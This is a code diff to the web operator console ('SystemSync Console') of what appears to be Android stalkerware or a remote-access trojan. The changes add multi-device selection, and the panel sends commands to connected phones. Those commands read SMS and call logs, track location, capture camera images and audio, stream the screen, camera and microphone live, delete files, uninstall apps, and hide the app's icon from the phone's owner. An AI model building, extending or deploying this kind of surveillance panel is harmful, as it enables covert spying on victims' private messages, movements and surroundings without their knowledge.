@@ -133,19 +133,30 @@
             font-weight:600;
             color:#1a2634;
         }
-        #deviceSelector {
-            padding: 6px 12px;
-            border-radius: 20px;
-            border: 1px solid #d0d9e2;
-            background: white;
-            font-size: 13px;
-            min-width: 180px;
-            margin-left: 15px;
-        }
         .header-left {
             display: flex;
             align-items: center;
             gap: 15px;
+        }
+        .device-selector-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        #deviceSelector {
+            padding: 8px 12px;
+            border-radius: 20px;
+            border: 1px solid #d0d9e2;
+            background: white;
+            font-size: 14px;
+            min-width: 200px;
+        }
+        .device-count {
+            background: #1976ff;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
         }
         .header-right {
             display: flex;
@@ -611,45 +622,14 @@
             color: white;
             border: none;
         }
-        /* Register modal */
-        .register-modal {
-            background: white;
-            padding: 30px;
-            border-radius: 16px;
-            width: 350px;
-            max-width: 90%;
+        .no-device-message {
+            padding: 40px;
+            text-align: center;
+            color: #7b8a9b;
         }
-        .register-modal h3 {
-            margin-top: 0;
-            color: #1a2634;
-        }
-        .register-modal input {
-            width: 100%;
-            padding: 12px;
-            margin: 15px 0;
-            border: 1px solid #d0d9e2;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-        .register-modal .buttons {
-            display: flex;
-            gap: 10px;
-        }
-        .register-modal button {
-            flex: 1;
-            padding: 10px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: 600;
-        }
-        .register-modal .register-btn {
-            background: #1976ff;
-            color: white;
-        }
-        .register-modal .later-btn {
-            background: #f0f2f5;
-            color: #1a2634;
+        .no-device-message .icon {
+            font-size: 48px;
+            margin-bottom: 15px;
         }
     </style>
 </head>
@@ -668,19 +648,6 @@
             <button id="modalRecordBtn" title="Record">🔴</button>
             <button id="modalFullscreenBtn" class="fullscreen-btn" title="Fullscreen">⛶</button>
             <button id="modalCloseBtn" class="close-btn" title="Close">✕</button>
-        </div>
-    </div>
-</div>
-
-<!-- Device registration modal -->
-<div id="registerModal" class="modal-overlay" style="display: none;">
-    <div class="register-modal">
-        <h3>📱 Device Registration</h3>
-        <p>Give this device a custom name:</p>
-        <input type="text" id="deviceCustomName" placeholder="e.g., John's Phone" value="">
-        <div class="buttons">
-            <button class="register-btn" onclick="registerDevice()">Register</button>
-            <button class="later-btn" onclick="closeRegisterModal()">Later</button>
         </div>
     </div>
 </div>
@@ -748,9 +715,12 @@
     <div id="header">
         <div class="header-left">
             <span>Control Panel</span>
-            <select id="deviceSelector" onchange="switchDevice(this.value)">
-                <option value="">Select Device</option>
-            </select>
+            <div class="device-selector-container">
+                <select id="deviceSelector" onchange="switchDevice(this.value)">
+                    <option value="">Select Device</option>
+                </select>
+                <span class="device-count" id="deviceCount">0</span>
+            </div>
         </div>
         <div class="header-right">
             <div id="batteryInfo" style="display: none;">
@@ -765,7 +735,11 @@
     </div>
     <div id="content">
         <div id="main-panel">
-            Ready. Click any button to send command.
+            <div id="welcomeMessage">
+                <h2>👋 Welcome to SystemSync Console</h2>
+                <p>Waiting for devices to connect...</p>
+                <p>When a device installs the app, it will appear in the dropdown menu above.</p>
+            </div>
         </div>
     </div>
 </div>
@@ -799,7 +773,7 @@
     // Track the last command sent to interpret raw responses
     let pendingCommand = null;
 
-    // Store connected devices
+    // Store connected devices - IMPORTANT: This will be populated when devices connect
     let devices = new Map(); // deviceId -> device info
     let currentDeviceId = null;
 
@@ -863,7 +837,6 @@
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
 
-        // Add transceivers to receive media
         if (streamType === 'screen') {
             pc.addTransceiver('video', { direction: 'recvonly' });
         } else if (streamType === 'camera') {
@@ -895,13 +868,9 @@
                 }
             }
         };
-        pc.onconnectionstatechange = () => {
-            console.log(`${streamType} connection state:`, pc.connectionState);
-        };
         return pc;
     }
 
-    // Helper to get the correct peer connection based on stream type
     function getPCForType(type) {
         if (type === 'screen') return screenPC;
         if (type === 'camera') return cameraPC;
@@ -922,7 +891,6 @@
             const pc = getPCForType(msg.streamType);
             if (pc && msg.candidate) {
                 pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
-                console.log('ICE candidate added for', msg.streamType);
             }
         }
     }
@@ -951,9 +919,13 @@
         modalRecordBtn.innerText = '🔴';
     }
 
-    // ---------- SCREEN SHARE (modified for modal) ----------
+    // ---------- SCREEN SHARE ----------
     async function toggleScreen() {
-        console.log('toggleScreen called, current screenActive:', screenActive);
+        if (!currentDeviceId) {
+            alert('Please select a device first');
+            return;
+        }
+
         if (screenActive) {
             if (screenPC) {
                 screenPC.close();
@@ -991,7 +963,7 @@
         }
     }
 
-    // ---------- SNAP SCREEN (from modal) ----------
+    // ---------- SNAP SCREEN ----------
     function snapScreenFromModal() {
         if (!modalVideo || !modalVideo.videoWidth) {
             alert('No active screen share or video not ready');
@@ -1011,7 +983,7 @@
         }, 'image/png');
     }
 
-    // ---------- RECORD SCREEN (from modal) ----------
+    // ---------- RECORD SCREEN ----------
     let screenMediaRecorder = null;
     let screenRecordedChunks = [];
 
@@ -1066,7 +1038,6 @@
         modalRecordBtn.innerText = '🟢';
     }
 
-    // Fullscreen toggle
     function toggleFullscreen() {
         if (!document.fullscreenElement) {
             modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
@@ -1075,7 +1046,6 @@
         }
     }
 
-    // Attach modal button listeners
     modalSnapBtn.addEventListener('click', snapScreenFromModal);
     modalRecordBtn.addEventListener('click', toggleScreenRecording);
     modalFullscreenBtn.addEventListener('click', toggleFullscreen);
@@ -1083,6 +1053,11 @@
 
     // ---------- LIVE CAMERA ----------
     async function startLiveStream() {
+        if (!currentDeviceId) {
+            alert('Please select a device first');
+            return;
+        }
+
         const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
         const useMic = document.getElementById('liveMicCheckbox').checked;
 
@@ -1098,7 +1073,6 @@
         cameraPC = createPeerConnection('camera', (e) => {
             const video = document.getElementById('liveCamVideo');
             if (video) video.srcObject = e.streams[0];
-            console.log('ontrack for camera', e.streams);
         }, useMic);
 
         try {
@@ -1130,6 +1104,11 @@
 
     // ---------- LIVE AUDIO ----------
     async function toggleLiveAudio() {
+        if (!currentDeviceId) {
+            alert('Please select a device first');
+            return;
+        }
+
         if (audioPC) {
             stopLiveAudio();
         } else {
@@ -1145,7 +1124,6 @@
                 audioEl.srcObject = e.streams[0];
                 audioEl.play().catch(err => console.log('Autoplay prevented:', err));
             }
-            console.log('ontrack for audio', e.streams);
         }, true);
 
         try {
@@ -1180,35 +1158,50 @@
 
     // ---------- COMMAND SENDING (JSON) ----------
     function sendCommand(command, params = {}) {
+        if (!currentDeviceId) {
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
+            return;
+        }
+
         if (!ws || ws.readyState !== WebSocket.OPEN) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
             return;
         }
+
         const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
         const payload = {
             type: 'COMMAND',
             command: command,
             requestId: requestId,
+            deviceId: currentDeviceId,  // Include the selected device ID
             params: params,
             timestamp: Date.now()
         };
         ws.send(JSON.stringify(payload));
-        panel.innerHTML = `📤 Command sent: ${command}`;
+        panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
         pendingCommand = command;
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
+    // ---------- PLAIN TEXT SENDING ----------
     function sendPlainText(msg) {
+        if (!currentDeviceId) {
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
+            return;
+        }
+
         if (!ws || ws.readyState !== WebSocket.OPEN) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
             return;
         }
+
+        // For plain text, we need to prefix with device ID or handle differently
+        // This depends on your server implementation
         ws.send(msg);
         panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
-    // Handle device registration
+    // Handle device registration - called when a device connects
     function handleDeviceRegistration(data) {
         const deviceId = data.deviceId;
         const deviceName = data.name || data.manufacturer + ' ' + data.model;
@@ -1223,11 +1216,26 @@
         });
         
         updateDeviceSelector();
+        
+        // Show notification that a new device connected
+        showNotification(`New device connected: ${deviceName}`);
+        
+        // If this is the first device, automatically select it
+        if (devices.size === 1) {
+            currentDeviceId = deviceId;
+            document.getElementById('deviceSelector').value = deviceId;
+            showWelcomeMessage(false);
+        }
     }
 
     // Update device selector dropdown
     function updateDeviceSelector() {
         const selector = document.getElementById('deviceSelector');
+        const countSpan = document.getElementById('deviceCount');
+        
+        // Save current selection
+        const currentValue = selector.value;
+        
         selector.innerHTML = '<option value="">Select Device</option>';
         
         devices.forEach((device, id) => {
@@ -1239,16 +1247,43 @@
             }
             selector.appendChild(option);
         });
+        
+        countSpan.textContent = devices.size;
+        
+        // If we had a current selection that's still valid, keep it
+        if (currentValue && devices.has(currentValue)) {
+            selector.value = currentValue;
+        }
     }
 
     // Switch to different device
     function switchDevice(deviceId) {
+        if (!deviceId) {
+            currentDeviceId = null;
+            showWelcomeMessage(true);
+            return;
+        }
+        
         currentDeviceId = deviceId;
-        if (deviceId && ws && ws.readyState === WebSocket.OPEN) {
+        showWelcomeMessage(false);
+        
+        // Optional: Notify server about device switch
+        if (ws && ws.readyState === WebSocket.OPEN) {
             ws.send(JSON.stringify({
                 type: 'SWITCH_DEVICE',
                 deviceId: deviceId
             }));
+        }
+        
+        showNotification(`Switched to ${devices.get(deviceId)?.name}`);
+    }
+
+    // Show/hide welcome message
+    function showWelcomeMessage(show) {
+        if (show && devices.size === 0) {
+            document.getElementById('welcomeMessage').style.display = 'block';
+        } else {
+            document.getElementById('welcomeMessage').style.display = 'none';
         }
     }
 
@@ -1310,140 +1345,114 @@
         panel.innerHTML = html;
     }
 
-    // Uninstall app
     function uninstallApp(packageName) {
         if (confirm(`Uninstall ${packageName}?`)) {
             sendCommand('UNINSTALL_APP', { package: packageName });
         }
     }
 
-    // Open app
     function openApp(packageName) {
         sendCommand('OPEN_APP', { package: packageName });
     }
 
-    // Delete file
     function deleteFile(path) {
         if (confirm(`Delete ${path}?`)) {
             sendCommand('DELETE_FILE', { path: path });
         }
     }
 
-    // Show registration modal for new devices
-    function showRegistrationModal() {
-        document.getElementById('registerModal').style.display = 'flex';
-    }
-
-    function closeRegisterModal() {
-        document.getElementById('registerModal').style.display = 'none';
-    }
-
-    function registerDevice() {
-        const name = document.getElementById('deviceCustomName').value.trim();
-        if (name) {
-            sendCommand('REGISTER_DEVICE', { name: name });
-            closeRegisterModal();
-        }
-    }
-
     // ---------- PLAIN TEXT / JSON HANDLERS ----------
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
+        
+        // If this response has a deviceId and it's not the current device, 
+        // we might want to handle it differently
+        if (json.deviceId && json.deviceId !== currentDeviceId) {
+            console.log('Message from non-selected device:', json.deviceId);
+            // Optionally add to devices if not already present
+            if (!devices.has(json.deviceId)) {
+                handleDeviceRegistration({
+                    deviceId: json.deviceId,
+                    name: json.deviceName || 'Unknown Device'
+                });
+            }
+            return;
+        }
+
         switch (json.type) {
             case 'DEVICE_REGISTRATION':
                 handleDeviceRegistration(json);
-                pendingCommand = null;
                 break;
 
             case 'DEVICE_INFO':
                 if (json.batteryLevel !== undefined) {
                     updateBatteryInfo(json.batteryLevel, json.batteryCharging || false);
                 }
-                pendingCommand = null;
                 break;
 
             case 'INSTALLED_APPS':
                 displayInstalledApps(json.data);
-                pendingCommand = null;
                 break;
 
             case 'FILE_DELETED':
                 showNotification('File deleted');
                 sendCommand('LIST_FILES', { path: currentPath });
-                pendingCommand = null;
                 break;
 
             case 'DEVICE_REGISTERED':
                 showNotification('Device registered successfully');
-                pendingCommand = null;
                 break;
 
             case 'SMS_DATA':
-                console.log('📩 SMS_DATA received', json.data);
                 dataType = 'sms';
                 currentData = json.data;
                 renderTable();
-                pendingCommand = null;
                 break;
 
             case 'CALL_LOGS':
                 dataType = 'call';
                 currentData = json.data;
                 renderTable();
-                pendingCommand = null;
                 break;
 
             case 'FILE_LIST':
                 dataType = 'file';
                 currentData = json.data;
                 renderFiles();
-                pendingCommand = null;
                 break;
 
             case 'LOCATION_UPDATE':
                 renderMap(json.data);
-                pendingCommand = null;
                 break;
 
             case 'CAMERA_IMAGE':
                 displayCapturedImage(json.data);
-                pendingCommand = null;
                 break;
 
             case 'AUDIO_RECORDING':
                 showAudio(json.data);
-                pendingCommand = null;
                 break;
 
             case 'ERROR':
                 panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
-                pendingCommand = null;
-                break;
-
-            case 'DEVICE_STATUS':
-                setStatus(json.status);
-                pendingCommand = null;
                 break;
 
             case 'APP_HIDDEN':
                 iconHidden = true;
                 document.getElementById('iconBtn').innerText = 'Show Icon';
                 showNotification('App icon hidden');
-                pendingCommand = null;
                 break;
 
             case 'APP_SHOWN':
                 iconHidden = false;
                 document.getElementById('iconBtn').innerText = 'Hide Icon';
                 showNotification('App icon shown');
-                pendingCommand = null;
                 break;
 
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 showNotification('Screen share started');
-                pendingCommand = null;
                 break;
 
             case 'SCREEN_SHARE_STOPPED':
@@ -1451,7 +1460,6 @@
                 document.getElementById('screenBtn').innerText = 'Start Screen';
                 if (screenPC) { screenPC.close(); screenPC = null; }
                 showNotification('Screen share stopped');
-                pendingCommand = null;
                 break;
 
             default:
@@ -1460,94 +1468,78 @@
                     dataType = 'file';
                     currentData = json;
                     renderFiles();
-                    pendingCommand = null;
                 } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                     dataType = 'sms';
                     currentData = json;
                     renderTable();
-                    pendingCommand = null;
                 } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                     dataType = 'call';
                     currentData = json;
                     renderTable();
-                    pendingCommand = null;
                 } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                     renderMap(json);
-                    pendingCommand = null;
                 }
                 break;
         }
+        
+        pendingCommand = null;
     }
 
     function handlePlainText(msg) {
         if (msg.startsWith("STATUS:")) {
             setStatus(msg.substring(7));
-            pendingCommand = null;
         } else if (msg.startsWith("LOC_DATA:")) {
             try {
                 const data = JSON.parse(msg.substring(9));
                 renderMap(data);
-                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("FILE_LIST:")) {
             try {
                 currentData = JSON.parse(msg.substring(10));
                 dataType = 'file';
                 renderFiles();
-                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("SMS_DATA:")) {
             try {
                 currentData = JSON.parse(msg.substring(9));
                 dataType = 'sms';
                 renderTable();
-                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
                 currentData = JSON.parse(msg.substring(10));
                 dataType = 'call';
                 renderTable();
-                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             const base64 = msg.substring(13);
             displayCapturedImage(base64);
-            pendingCommand = null;
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
-            pendingCommand = null;
         } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
             screenActive = true;
             document.getElementById('screenBtn').innerText = 'Stop Screen';
             showNotification('Screen share started');
-            pendingCommand = null;
         } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
             screenActive = false;
             document.getElementById('screenBtn').innerText = 'Start Screen';
             if (screenPC) { screenPC.close(); screenPC = null; }
             showNotification('Screen share stopped');
-            pendingCommand = null;
         } else if (msg.startsWith("APP_HIDDEN")) {
             iconHidden = true;
             document.getElementById('iconBtn').innerText = 'Show Icon';
             showNotification('App icon hidden');
-            pendingCommand = null;
         } else if (msg.startsWith("APP_SHOWN")) {
             iconHidden = false;
             document.getElementById('iconBtn').innerText = 'Hide Icon';
             showNotification('App icon shown');
-            pendingCommand = null;
         } else if (msg.startsWith("VIBRATE_DONE")) {
             showNotification('Vibration done');
-            pendingCommand = null;
         } else if (msg.startsWith("ERROR:")) {
             panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
-            pendingCommand = null;
         } else if (msg.startsWith("FILE_DATA:")) {
             const base64 = msg.substring(10);
             downloadBase64(base64, 'downloaded_file');
-            pendingCommand = null;
         } else if (msg.startsWith('[') || msg.startsWith('{')) {
             try {
                 const parsed = JSON.parse(msg);
@@ -1601,7 +1593,7 @@
         `;
     }
 
-    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
+    // ---------- LIVE STREAM ACTIONS ----------
     function takeSnapshot() {
         const video = document.getElementById('liveCamVideo');
         if (!video || !video.videoWidth) {
@@ -1650,12 +1642,7 @@
         canvas.height = video.videoHeight;
 
         function drawVideoFrame() {
-            ctx.save();
-            ctx.translate(canvas.width / 2, canvas.height / 2);
-            ctx.rotate(0);
-            ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
-                         video.videoWidth, video.videoHeight);
-            ctx.restore();
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             requestAnimationFrame(drawVideoFrame);
         }
         drawVideoFrame();
@@ -1938,14 +1925,19 @@
             console.log('WebSocket connected');
             ws.send('I_AM_WEB');
             setStatus('ONLINE');
-            panel.innerHTML = '✅ Connected to server. Ready.';
             
-            // Check for first run - show registration modal after 2 seconds
-            setTimeout(() => {
-                if (devices.size === 0) {
-                    showRegistrationModal();
-                }
-            }, 2000);
+            // Clear welcome message but keep it visible until devices appear
+            document.getElementById('welcomeMessage').innerHTML = `
+                <h2>👋 Welcome to SystemSync Console</h2>
+                <p>Waiting for devices to connect...</p>
+                <p>When a device installs the app, it will appear in the dropdown menu above.</p>
+            `;
+            document.getElementById('welcomeMessage').style.display = 'block';
+            
+            // Request list of online devices if supported by server
+            ws.send(JSON.stringify({
+                type: 'GET_DEVICES'
+            }));
         };
         ws.onmessage = (e) => {
             console.log('RAW message:', e.data);
@@ -2010,8 +2002,6 @@
     window.openApp = openApp;
     window.deleteFile = deleteFile;
     window.switchDevice = switchDevice;
-    window.registerDevice = registerDevice;
-    window.closeRegisterModal = closeRegisterModal;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
